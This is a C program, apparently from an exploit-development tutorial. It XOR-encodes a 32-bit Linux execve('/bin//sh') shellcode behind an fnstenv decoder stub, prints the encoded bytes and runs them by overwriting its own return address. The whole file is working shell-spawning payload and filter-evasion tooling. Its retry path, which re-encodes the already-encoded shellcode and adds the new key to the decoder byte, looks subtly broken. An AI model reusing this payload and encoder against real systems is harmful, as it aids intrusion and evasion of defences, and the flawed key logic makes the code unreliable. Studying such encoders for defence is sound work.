#include <sys/time.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int getnumber(int quo) { // random number generation function
	int seed;
	struct timeval tm;
	gettimeofday( &tm, NULL);
	seed = tm.tv_sec + tm.tv_usec;
	srandom( seed );
	return (random() % quo);
}

void execute(char *data) { // test function to execute encoded shellcode
	printf("Executing...\n");
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)data;
}

void print_code(char *data) { // prints out the shellcode
	int i,l = 15;
	for (i = 0; i < strlen(data); ++i) {
		if (l >= 15) {
			if (i)
				printf("\"\n");
				printf("\t\"");
				l = 0;
			}
			++l;
			printf("\\x%02x", ((unsigned char *)data) [i]);
		}
	printf("\";\n\n");
}

int main() { // main function
	char shellcode[] = // original shellcode
		"\x31\xc0\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
		"\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

	int count;
	int number = getnumber(200); // random number generator
	int badchar = 0; // used as flag to check for bad chars
	int ldecoder;	// length of decoder
	int lshellcode = strlen(shellcode); // store length of shellcode
	char *result;

	// simple fnstenv xor decoder, nulls are overwritten with length and key
	char decoder[] = "\xd9\xe1\xd9\x74\x24\xf4\x5a\x80\xc2\x00\x31"
		"\xc9\xb1\x18\x80\x32\x00\x42\xe2\xfa";

	printf("Using the key: %d to xor encode the shellcode\n", number);
	decoder[9] += 0x14; // length of decoder
	decoder[16] += number; // key to encode with
	ldecoder = strlen(decoder); // calculate length of decoder

	printf("\nchar original_shellcode[] =\n");
	print_code(shellcode);

	do {				// encode the shellcode
		if(badchar == 1) { 	// if bad char, regenerate key
			number = getnumber(10);
			decoder[16] += number;
			badchar = 0;
		}
		for(count=0; count < lshellcode; count++) { // loop through shellcode
			shellcode[count] = shellcode[count] ^ number; // xor encode byte
			if(shellcode[count] == '\0') { // other bad chars can be listed here
				badchar = 1; // set bad char flag, will trigger redo
			}
		}
	}
	while(badchar == 1); 	// repeat if badchar was found

	result = malloc(lshellcode + ldecoder);
	strcpy(result,decoder);	// place decoder in front of buffer
	strcat(result,shellcode); // place encoded shellcode behind decoder
	printf("\nchar encoded[] =\n"); // print label
	print_code(result); 		// print encoded shellcode
	execute(result);		// execute the encoded shellcode
}

